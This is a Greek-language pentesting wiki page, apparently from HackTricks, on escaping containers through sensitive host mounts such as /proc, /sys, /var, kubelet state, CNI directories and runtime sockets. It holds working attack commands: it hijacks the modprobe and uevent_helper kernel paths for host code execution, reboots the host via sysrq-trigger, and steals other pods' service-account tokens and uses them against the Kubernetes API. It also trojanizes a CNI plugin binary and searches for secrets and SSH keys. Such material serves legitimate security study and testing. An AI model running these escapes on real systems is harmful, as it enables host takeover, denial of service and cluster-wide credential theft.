# Ευαίσθητα Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Host mounts είναι μία από τις σημαντικότερες πρακτικές επιφάνειες container-escape, επειδή συχνά καταργούν την προσεκτικά απομονωμένη προβολή διεργασιών και επαναφέρουν την άμεση ορατότητα των host resources. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Τα bind mounts των `/proc`, `/sys`, `/var`, των runtime sockets, της κατάστασης που διαχειρίζεται το kubelet ή paths που σχετίζονται με συσκευές μπορούν να εκθέσουν kernel controls, credentials, filesystems γειτονικών containers και runtime management interfaces.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας, επειδή το abuse model είναι cross-cutting. Ένα writable host mount είναι επικίνδυνο εν μέρει εξαιτίας των mount namespaces, εν μέρει εξαιτίας των user namespaces, εν μέρει εξαιτίας της κάλυψης από AppArmor ή SELinux και εν μέρει εξαιτίας του ακριβούς host path που εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστού θέματος κάνει την κατανόηση της attack surface πολύ ευκολότερη.

## Έκθεση του `/proc`

Το procfs περιέχει τόσο συνηθισμένες πληροφορίες διεργασιών όσο και kernel control interfaces υψηλού αντίκτυπου. Επομένως, ένα bind mount όπως το `-v /proc:/host/proc` ή ένα container view που εκθέτει μη αναμενόμενα writable proc entries μπορεί να οδηγήσει σε information disclosure, denial of service ή άμεση εκτέλεση κώδικα στον host.

Σημαντικά procfs paths περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Ξεκινήστε ελέγχοντας ποια procfs entries υψηλής αξίας είναι ορατά ή writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτές οι διαδρομές είναι ενδιαφέρουσες για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να καταστούν paths για host code-execution όταν είναι εγγράψιμα. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` είναι ισχυρές πηγές reconnaissance για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν context διεργασιών, cgroups και filesystem, που μπορεί να βοηθήσει στην ανακατασκευή της διάταξης του host από το εσωτερικό του container.

Η πρακτική αξία κάθε path διαφέρει, και η αντιμετώπισή τους σαν να είχαν όλα τον ίδιο αντίκτυπο δυσκολεύει το triage:

- `/proc/sys/kernel/core_pattern`
Αν είναι εγγράψιμο, είναι ένα από τα paths του procfs με τον υψηλότερο αντίκτυπο, επειδή ο kernel εκτελεί έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει host code execution. Δείτε επίσης το [read-only-paths.md](protections/read-only-paths.md) για ένα ειδικό παράδειγμα.
- `/proc/sys/kernel/modprobe`
Αυτό το path ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει τη λογική φόρτωσης modules. Αν είναι εγγράψιμο από το container και ερμηνεύεται στο host context, μπορεί να καταστεί ένα ακόμη primitive για host code execution. Είναι ιδιαίτερα ενδιαφέρον όταν συνδυάζεται με έναν τρόπο ενεργοποίησης του helper path.
- `/proc/sys/vm/panic_on_oom`
Αυτό συνήθως δεν είναι clean escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε host-wide denial of service, μετατρέποντας τις συνθήκες OOM σε συμπεριφορά kernel panic.
- `/proc/sys/fs/binfmt_misc`
Αν το registration interface είναι εγγράψιμο, ο attacker μπορεί να καταχωρίσει έναν handler για μια επιλεγμένη magic value και να αποκτήσει host-context execution όταν εκτελείται ένα αρχείο που ταιριάζει.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά στον προσδιορισμό των subsystems, των mitigations και των προαιρετικών kernel features που είναι ενεργοποιημένα, χωρίς να απαιτούνται host package metadata.
- `/proc/sysrq-trigger`
Κυρίως denial-of-service path, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic ή να διαταράξει με άλλον τρόπο τον host άμεσα.
- `/proc/kmsg`
Αποκαλύπτει μηνύματα από το kernel ring buffer. Είναι χρήσιμο για host fingerprinting, crash analysis και, σε ορισμένα περιβάλλοντα, για leaking πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
Είναι πολύτιμο όταν είναι readable, επειδή εκθέτει πληροφορίες για exported kernel symbols και μπορεί να βοηθήσει στην παράκαμψη υποθέσεων address randomization κατά την ανάπτυξη kernel exploit.
- `/proc/[pid]/mem`
Αυτό είναι ένα direct interface στη μνήμη διεργασιών. Αν η target process είναι προσβάσιμη με τις απαιτούμενες ptrace-style προϋποθέσεις, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης μιας άλλης διεργασίας. Ο πραγματικός αντίκτυπος εξαρτάται σε μεγάλο βαθμό από τα credentials, το `hidepid`, το Yama και τους περιορισμούς του ptrace, επομένως είναι ένα ισχυρό αλλά conditional path.
- `/proc/kcore`
Εκθέτει μια core-image-style προβολή της μνήμης του system. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά readable, υποδεικνύει ένα σοβαρά exposed host memory surface.
- `/proc/kmem` και `/proc/mem`
Ιστορικά high-impact raw memory interfaces. Σε πολλά σύγχρονα systems είναι απενεργοποιημένα ή heavily restricted, αλλά αν υπάρχουν και είναι usable, πρέπει να αντιμετωπίζονται ως critical findings.
- `/proc/sched_debug`
Κάνει leak πληροφοριών scheduling και tasks, οι οποίες μπορεί να αποκαλύψουν identities διεργασιών του host, ακόμη και όταν οι υπόλοιπες process views φαίνονται καθαρότερες από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Είναι εξαιρετικά χρήσιμο για την ανακατασκευή του πού βρίσκεται πραγματικά το container στον host, ποια paths υποστηρίζονται από overlay και αν ένα writable mount αντιστοιχεί σε περιεχόμενο του host ή μόνο στο container layer.

Αν το `/proc/[pid]/mountinfo` ή οι λεπτομέρειες του overlay είναι readable, χρησιμοποιήστε τα για να ανακτήσετε το host path του filesystem του container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν τη μετατροπή μιας διαδρομής μέσα στο container στην αντίστοιχη διαδρομή από την οπτική του host.

### Πλήρες Παράδειγμα: Κατάχρηση Διαδρομής Βοηθητικού `modprobe`

Αν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και η διαδρομή του helper ερμηνεύεται στο context του host, μπορεί να ανακατευθυνθεί σε ένα payload που ελέγχεται από τον attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Ο ακριβής trigger εξαρτάται από τον στόχο και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι ένα writable helper path μπορεί να ανακατευθύνει μια μελλοντική κλήση kernel helper σε περιεχόμενο host-path που ελέγχεται από τον attacker.

### Πλήρες Παράδειγμα: Kernel Recon Με `kallsyms`, `kmsg` Και `config.gz`

Αν ο στόχος είναι η αξιολόγηση exploitability και όχι ένα άμεσο escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν τα πρόσφατα μηνύματα του kernel αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες δυνατότητες ή mitigations του kernel έχουν συμπεριληφθεί κατά το compile. Ο αντίκτυπος συνήθως δεν είναι άμεσο escape, αλλά μπορεί να συντομεύσει σημαντικά το triage για ευπάθειες του kernel.

### Πλήρες παράδειγμα: SysRq Host Reboot

Αν το `/proc/sysrq-trigger` είναι writable και φτάνει στο host view:
```bash
echo b > /proc/sysrq-trigger
```
Το αποτέλεσμα είναι άμεση επανεκκίνηση του host. Αυτό δεν είναι ένα διακριτικό παράδειγμα, αλλά καταδεικνύει ξεκάθαρα ότι η έκθεση του procfs μπορεί να είναι πολύ σοβαρότερη από μια απλή αποκάλυψη πληροφοριών.

## Έκθεση του `/sys`

Το sysfs εκθέτει μεγάλες ποσότητες κατάστασης του kernel και των συσκευών. Ορισμένα μονοπάτια του sysfs είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση helper, τη συμπεριφορά συσκευών, τη ρύθμιση security modules ή την κατάσταση του firmware.

Σημαντικά μονοπάτια του sysfs περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα μονοπάτια είναι σημαντικά για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά της διαχείρισης θερμοκρασίας και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με κακή έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να προκαλέσει leak πληροφοριών σχετικά με crash dumps και τη διάταξη του kernel, οι οποίες βοηθούν στο low-level fingerprinting του host. Το `/sys/kernel/security` είναι το interface του `securityfs` που χρησιμοποιείται από τα Linux Security Modules, επομένως η μη αναμενόμενη πρόσβαση σε αυτό μπορεί να εκθέσει ή να τροποποιήσει κατάσταση σχετική με MAC. Τα μονοπάτια μεταβλητών EFI μπορούν να επηρεάσουν ρυθμίσεις εκκίνησης που υποστηρίζονται από το firmware, γεγονός που τα καθιστά πολύ πιο σοβαρά από τα συνηθισμένα αρχεία configuration. Το `debugfs` στο `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο, επειδή αποτελεί σκόπιμα interface προσανατολισμένο σε developers, με πολύ λιγότερες προσδοκίες ασφάλειας σε σχέση με τα hardened kernel APIs που απευθύνονται σε production περιβάλλοντα.

Χρήσιμες εντολές ελέγχου για αυτά τα μονοπάτια είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι κάνει αυτά τα paths ενδιαφέροντα:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποιο άλλο LSM surface είναι ορατό με τρόπο που θα έπρεπε να παραμένει διαθέσιμο μόνο στο host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και readable ή writable, αναμένεται μια ευρεία επιφάνεια που επικοινωνεί με τον kernel, με τον ακριβή κίνδυνο να εξαρτάται από τα ενεργοποιημένα debug nodes.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συνηθισμένη, αλλά αν υπάρχει έχει υψηλό impact, επειδή αφορά ρυθμίσεις που υποστηρίζονται από το firmware και όχι συνηθισμένα runtime files.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το hardware, όχι ένα neat shell-style escape.
- Το `/sys/kernel/vmcoreinfo` αποτελεί κυρίως πηγή host-fingerprinting και crash analysis, χρήσιμη για την κατανόηση της low-level κατάστασης του kernel.

### Full Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να εκτελέσει ένα helper που ελέγχεται από τον attacker όταν ενεργοποιηθεί ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος που αυτό λειτουργεί είναι ότι η διαδρομή του helper ερμηνεύεται από την οπτική γωνία του host. Μόλις ενεργοποιηθεί, το helper εκτελείται στο context του host και όχι μέσα στο τρέχον container.

## Έκθεση του `/var`

Η προσάρτηση του `/var` του host σε ένα container συχνά υποτιμάται, επειδή δεν φαίνεται τόσο δραματική όσο η προσάρτηση του `/`. Στην πράξη, μπορεί να είναι αρκετή για την πρόσβαση σε runtime sockets, καταλόγους snapshot των containers, volumes των pods που διαχειρίζεται το kubelet, projected service-account tokens και filesystems γειτονικών εφαρμογών. Σε σύγχρονους nodes, το `/var` είναι συχνά το σημείο όπου βρίσκεται στην πραγματικότητα η πιο ενδιαφέρουσα από επιχειρησιακής άποψης κατάσταση των containers.

### Παράδειγμα Kubernetes

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει projected tokens άλλων pods και περιεχόμενο overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν αν το mount εκθέτει μόνο ασήμαντα δεδομένα εφαρμογής ή credentials του cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί να μετατρέψει άμεσα την τοπική εκτέλεση κώδικα σε πρόσβαση στο Kubernetes API.

Αν υπάρχει το token, επικυρώστε τι μπορεί να προσπελάσει αντί να σταματήσετε στην ανακάλυψη του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση σε local node. Ένα token με ευρύ RBAC μπορεί να μετατρέψει ένα mounted `/var` σε compromise ολόκληρου του cluster.

### Παράδειγμα Docker και containerd

Σε Docker hosts, τα σχετικά δεδομένα βρίσκονται συχνά στο `/var/lib/docker`, ενώ σε Kubernetes nodes που βασίζονται στο containerd μπορεί να βρίσκονται στο `/var/lib/containerd` ή σε paths ειδικά για τον snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Αν το προσαρτημένο `/var` εκθέτει εγγράψιμα περιεχόμενα snapshot ενός άλλου workload, ο attacker ενδέχεται να μπορεί να τροποποιήσει αρχεία εφαρμογών, να τοποθετήσει web content ή να αλλάξει startup scripts χωρίς να αγγίξει την τρέχουσα container configuration.

Συγκεκριμένες ιδέες abuse όταν εντοπιστούν εγγράψιμα περιεχόμενα snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων των mounted `/var`: tampering εφαρμογών, ανάκτηση secrets και lateral movement σε γειτονικά workloads.

## Κατάσταση Kubelet, Plugins και CNI Paths

Ένα mount των `/var/lib/kubelet`, `/opt/cni/bin` ή `/etc/cni/net.d` εκτίθεται συχνά μέσω privileged DaemonSets, CNI agents, CSI node plugins, GPU operators και storage helpers. Αυτά τα mounts είναι εύκολο να θεωρηθούν απλώς "node plumbing", αλλά βρίσκονται απευθείας στη διαδρομή εκτέλεσης για νέα pods και συχνά περιέχουν kubelet credentials, projected secrets, registration sockets και εκτελέσιμα host-side plugin binaries.

Οι στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές review είναι:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Γιατί έχουν σημασία αυτά τα paths:

- Το `/var/lib/kubelet/pki` ενδέχεται να εκθέτει kubelet client certificates και άλλα node-local credentials, τα οποία μερικές φορές μπορούν να επαναχρησιμοποιηθούν απέναντι στο API server ή σε kubelet-facing TLS endpoints, ανάλογα με τον σχεδιασμό του cluster.
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και mounted Secrets για neighboring pods στο ίδιο node.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` αποτελεί κυρίως επιφάνεια reconnaissance, αλλά είναι ιδιαίτερα χρήσιμο: αποκαλύπτει ποια pods και containers κατέχουν αυτήν τη στιγμή GPUs, hugepages, SR-IOV devices και άλλους scarce node-local resources.
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και με ποια sockets αναμένεται να επικοινωνεί το kubelet. Αν αυτοί οι κατάλογοι είναι writable και όχι απλώς readable, το εύρημα γίνεται πολύ σοβαρότερο.
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στη διαδρομή ρύθμισης του pod-network. Η writable πρόσβαση εκεί αποτελεί συχνά ένα delayed host-execution primitive και όχι απλώς έκθεση configuration.

### Πλήρες παράδειγμα: Writable `/opt/cni/bin`

Αν ένας host CNI binary directory έχει γίνει mount read-write, η αντικατάσταση ενός plugin μπορεί να είναι αρκετή για την απόκτηση host execution την επόμενη φορά που το kubelet θα δημιουργήσει ένα pod sandbox σε αυτό το node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά είναι συχνά πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Το σημαντικό σημείο είναι ότι το τροποποιημένο binary εκτελείται αργότερα από τη ροή ρύθμισης του host network και όχι από το τρέχον container.


## Runtime Sockets

Τα ευαίσθητα host mounts συχνά περιλαμβάνουν runtime sockets αντί για ολόκληρους καταλόγους. Είναι τόσο σημαντικά, ώστε αξίζει να επαναληφθούν ρητά εδώ:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για τις πλήρεις ροές exploitation μόλις γίνει mount ένα από αυτά τα sockets.

Ως ένα γρήγορο αρχικό μοτίβο αλληλεπίδρασης:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Εάν κάποιο από αυτά επιτύχει, η διαδρομή από ένα "mounted socket" έως την "start a more privileged sibling container" είναι συνήθως πολύ συντομότερη από οποιαδήποτε διαδρομή kernel breakout.

## Task Hijack μέσω Writable Host Path

Ένα writable host mount δεν χρειάζεται να εκθέτει το `/` για να είναι επικίνδυνο. Εάν το mounted path περιέχει scripts, αρχεία config, hooks, plugins ή αρχεία που καταναλώνονται αργότερα από μια scheduled task ή service στην πλευρά του host, το container ενδέχεται να μπορεί να αλλάξει αυτό που εκτελεί ο host.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Εάν ένα εγγράψιμο αρχείο χρησιμοποιείται από μια διεργασία host, διατηρήστε το payload απλό και παρατηρήσιμο κατά τη δοκιμή:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Το ενδιαφέρον μέρος είναι το όριο εμπιστοσύνης: η εγγραφή πραγματοποιείται μέσα από το container, αλλά η εκτέλεση γίνεται αργότερα στο context της υπηρεσίας του host. Αυτό μετατρέπει ένα περιορισμένο hostPath ή bind mount σε primitive καθυστερημένης εκτέλεσης κώδικα στον host.

## CVEs που σχετίζονται με Mounts

Τα host mounts σχετίζονται επίσης με vulnerabilities του runtime. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- Το `CVE-2024-21626` στο `runc`, όπου ένα leaked directory file descriptor μπορούσε να τοποθετήσει το working directory στο filesystem του host.
- Τα `CVE-2024-23651`, `CVE-2024-23652` και `CVE-2024-23653` στο BuildKit, όπου κακόβουλα Dockerfiles, frontends και ροές `RUN --mount` μπορούσαν να επαναφέρουν πρόσβαση σε αρχεία του host, διαγραφή ή elevated privileges κατά τη διάρκεια των builds.
- Το `CVE-2024-1753` στα Buildah και Podman build flows, όπου crafted bind mounts κατά το build μπορούσαν να εκθέσουν το `/` με read-write πρόσβαση.
- Το `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά το image unpack μπορούσε να επιτρέψει σε ένα specially crafted image να τροποποιήσει το filesystem του host κατά το pull.

Αυτά τα CVEs είναι σημαντικά εδώ επειδή δείχνουν ότι η διαχείριση των mounts δεν αφορά μόνο τη ρύθμιση από τον operator. Το ίδιο το runtime μπορεί επίσης να εισαγάγει mount-driven escape conditions.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις mount exposures με τη μεγαλύτερη αξία:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Τι είναι ενδιαφέρον εδώ:

- Το host root, `/proc`, `/sys`, `/var` και τα runtime sockets είναι όλα findings υψηλής προτεραιότητας.
- Τα εγγράψιμα entries των proc/sys συχνά σημαίνουν ότι το mount εκθέτει host-global kernel controls αντί για μια ασφαλή container view.
- Οι προσαρτημένες διαδρομές `/var` απαιτούν έλεγχο credentials και neighboring workloads, όχι μόνο έλεγχο του filesystem.
- Τα Kubelet state directories και τα CNI/plugin paths έχουν την ίδια προτεραιότητα με τα runtime sockets, επειδή συχνά βρίσκονται απευθείας στη διαδρομή δημιουργίας pods και διανομής credentials του node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
